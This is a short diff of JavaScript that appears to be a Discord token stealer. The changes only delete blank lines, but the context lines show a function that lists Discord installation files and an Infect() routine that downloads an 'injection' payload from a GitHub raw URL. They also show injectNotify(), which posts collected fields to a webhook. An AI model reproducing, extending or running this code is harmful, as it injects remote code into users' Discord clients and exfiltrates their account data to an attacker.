@@ -41,7 +41,6 @@ discords.forEach(function(file) {
     })
     
 });
-
 listDiscords();
 function Infect() {
     https.get('https://raw.githubusercontent.com/ugur014/ajwdbawjdbawjdbawjdbawjd/main/src/Injection/injection-clean', (resp) => {
@@ -162,7 +161,6 @@ function injectNotify() {
         }
         fields.push(c)
     })
-
     axios
 	.post(webhook, {
         "content": null, 
